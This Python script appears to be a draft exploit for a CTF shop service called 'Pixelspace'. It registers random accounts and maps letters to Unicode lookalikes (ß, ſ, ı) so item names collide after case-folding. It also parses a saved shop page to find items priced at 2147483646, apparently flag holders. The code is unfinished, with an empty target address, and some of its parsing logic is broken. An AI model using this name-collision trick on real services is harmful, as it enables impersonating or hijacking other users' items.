import requests
import secrets
import sys
import re
from bs4 import BeautifulSoup

IP = ""
PORT = "8010"
URL = ""
email_providers = [
    "gmail",
    "outlook",
    "gmx",
    "web",
    "protonmail",
    "aol",
    "zohomail",
    "enowars",
    ]

email_endings = [
    "de",
    "com",
    "uk",
    "it",
    "org",
    "net",
    "edu",
    "gov"
]

def make_item_name_exploitable(item_name:str) -> str:
    exploits = {
        'ss': 223,
        'SS': 223,
        's': 383,
        'S': 383,
        'i': 305,
        'I': 305,
    }
    res = ""
    for key in exploits:
        if key in item_name:
            index = item_name.index(key)
            res = item_name[0:index] + chr(exploits[key]) + item_name[index+len(key):]
            break
    return res

def create_user():
    global IP,PORT,email_endings,email_providers
    username = secrets.token_hex(12)
    password = secrets.token_hex(12)
    first_name = secrets.token_hex(5)
    last_name = secrets.token_hex(5)
    email = secrets.token_hex(8) + "@" + email_providers[secrets.randbelow(8)] +"." + email_endings[secrets.randbelow(8)]
    key = "TEXT"

    data={
        "username": username,
        "password1": password,
        "password2": password,
        "first_name": first_name,
        "last_name": last_name,
        "email": email,
        "cryptographic_key": key,
        "next/": "shop/1/",
    }
    headers={
        "Referer": URL+"/signup/"
    }

    response = requests.post(URL+"/signup/",data=data,headers=headers)
    if response.status_code != 200:
        print("User could not get created")
        exit(1)
    
def find_exploitable_item():
    page = """
    


<!DOCTYPE html>
<html>
    <head>
        <title>Pixelspace</title>
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link rel="stylesheet2" text="text/css" href='/static/service/css/main.css'>
        <meta name="viewport" content="width=device-width, initial-scale=1.0">        
    </head>
    <body>
        
<style>
  .status-msg{
    font-size: 18px;
    color: #fff;
    margin-right: 20px;
  }
</style>
<nav class="navbar navbar-expand-lg navbar-dark bg-dark">
    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNav" aria-controls="navbarNav" aria-expanded="false" aria-label="Toggle navigation">
      <span class="navbar-toggler-icon"></span>
    </button>
    <div class="collapse navbar-collapse" id="navbarNav">
      <ul class="navbar-nav">
        <li class="nav-item">
          <a class="nav-link active" href="/">Home</a>
        </li>
        <li class="nav-item">
          <a class="nav-link active" href="/shop/1/">Shop</a>
        </li>

        
        <li class="nav-item active">
          <a class="nav-link" href="/user_items/">Profile</a>
        </li>
        <li class="nav-item active">
          <a class="nav-link" href="/notes/">Notes</a>
        </li>
        <li>
        |
        </li>
        <li class="nav-item active">
          <a class="nav-link" href="/new_item/">Create new Item</a>
        </li>
        <li class="nav-item active">
          <a class="nav-link" href="/giftcode/create/">Create new Giftcode</a>
        </li>
        <li class="nav-item active">
          <a class="nav-link" href="/giftcode/">Submit Giftcode</a>
        </li>
        
      </ul>
    </div>
    
    <span class="status-msg">Hello, root</span>
    <span class="status-msg">Credits: 100</span>
    <span><a class="status-msg" href="/logout/">Logout</a></span>
    
  </nav>
        <div class="container-fluid">
            



<link crossorigin="anonymous" href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" rel="stylesheet">
<script crossorigin="anonymous" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js"></script>





There are 10 objects in the shop:
<br>

    <td><h4>uAVZMPZT by 6015b352ef5644a886e02613</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_xlkET3K.png"/></td><br>
    <td>Price: 142</td><br>
    <td>Description: mbfbfLuHzLrUPYbu</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-uAVZMPZT" href="item/109753">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>kczoPxWIGV by 3f6258282320c5516384d2be</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_YSa3olx.png"/></td><br>
    <td>Price: 998</td><br>
    <td>Description: rMcOSzOM</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-kczoPxWIGV" href="item/109754">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>JAPKKIWSLLZIDXC by 7b7ace2a8b5c31489ebaa8d6</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_0nvphiD.png"/></td><br>
    <td>Price: 2147483646</td><br>
    <td>Description: Navarro y and orphan who rose to prominence</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-JAPKKIWSLLZIDXC" href="item/109755">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>tncxmtCoH by f991ffd81d06adcb58170977</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_UF9TAIS.png"/></td><br>
    <td>Price: 128</td><br>
    <td>Description: NOOXP</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-tncxmtCoH" href="item/109756">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>NBUCCRWOIUKNZUBZCYDLEPMBMZQKTZ by 7c84a119410759135daaae77</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_BVVR2Ws.png"/></td><br>
    <td>Price: 2147483646</td><br>
    <td>Description: One such cater and market to a tilt</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-NBUCCRWOIUKNZUBZCYDLEPMBMZQKTZ" href="item/109757">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>DGPBVHWELZSCUXTUVQGWDSWZYVAEVSVUMZSNEEVN by 37f0116c0cf4436f2975a0a7</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_3lxBahp.png"/></td><br>
    <td>Price: 2147483646</td><br>
    <td>Description: Outsourcing services &amp;quot;river regime&amp;quot;. 
 
 In the United States, as</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-DGPBVHWELZSCUXTUVQGWDSWZYVAEVSVUMZSNEEVN" href="item/109758">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>ZTFOPUXHFUJLPYXJEIRUDBDREQNCHLVKM by 66c2771059d720d4677dfdbd</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_TKKbx0S.png"/></td><br>
    <td>Price: 2147483646</td><br>
    <td>Description: And fled &amp;#x27;laugh center&amp;#x27; in the south, the Greater Tampa Bay</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-ZTFOPUXHFUJLPYXJEIRUDBDREQNCHLVKM" href="item/109759">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>NuYQxt by de97cbda2f7f918325c65b66</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_f9rm5aS.png"/></td><br>
    <td>Price: 167</td><br>
    <td>Description: HzYwVgRqw</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-NuYQxt" href="item/109760">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>kUMqZwOWtcUjL by ec6df233212094a1eefd4a93</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_EBztben.png"/></td><br>
    <td>Price: 329</td><br>
    <td>Description: olWDfdVldhmPdwhQrH</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-kUMqZwOWtcUjL" href="item/109761">View item</a></td><br>
    <td>0 sold</td><br>
    <br>

    <td><h4>IOkRHGlMMIWdc by 10716751d3eadc85da729427</h4></td><br>
    <td><img src="/media/uploads/image_data/frog_1EWNYG6.png"/></td><br>
    <td>Price: 970</td><br>
    <td>Description: RSBUdCxoNpyRXJsDGjajCN</td><br>
    <ts>Rating: 0 (avg. from 0)</ts>
    <td><a id="viewable-IOkRHGlMMIWdc" href="item/109762">View item</a></td><br>
    <td>0 sold</td><br>
    <br>


<center>
<nav aria-label="...">
    <ul class="pagination">
        
        <li class="page-item active">
            <a class="page-link" href="/shop/0/">Previous</a>
        </li>
        
        <li class="page-item disabled">
            <a class="page-link" href="/shop/1/">1</a>
        </li>
        
        <li class="page-item active">
            <a class="page-link" href="/shop/2/">Next</a>
        </li>
        
           
    </ul>
</nav>
</center>


        </div>
        
        <hr>
        <h5>Footer</h5>
    </body>

    <script src="https://code.jquery.com/jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
</html>
    """
    #response = requests.get(URL+"shop/1/")
    data = BeautifulSoup(page,"html.parser")
    regex = '<td>Price: 2147483646</td><br>\n(.+?)\n(.+?)\n<td><a id="viewable-(.+?)" href="(.+?)">View Item</a></td><br>'
    #matches = re.findall(regex,response.text,re.MULTILINE)

    names = data.find_all(text=re.compile("<h4>(.*) by"))
    print(names)
    prices = data.find_all(text=re.compile("Price: (.*)"))
    print(prices)    
    tds = data.find_all('a')
    for t in tds:
        print(t)
        
    names = data.td
   
    print(names)


if __name__ == "__main__":
    find_exploitable_item()

